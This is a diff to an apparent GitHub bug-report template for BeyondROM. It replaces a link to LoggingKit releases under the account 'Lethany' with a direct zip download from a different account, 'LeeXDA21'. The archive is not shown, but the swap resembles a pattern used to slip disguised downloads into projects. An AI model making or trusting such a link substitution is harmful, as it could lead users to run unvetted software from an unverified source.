@@ -28,4 +28,4 @@ Add screenshots to help explain your problem.
  - Model: [e.g. G991B]
 
 **Additional context**
-- Gather logs by using [LoggingKit](https://github.com/Lethany/BeyondROM_Hub/releases) when applicable
+- Gather logs by using [LoggingKit_v5](https://github.com/LeeXDA21/BeyondROM_Hub/releases/download/v5.0/LoggingKit_v5.zip) when applicable
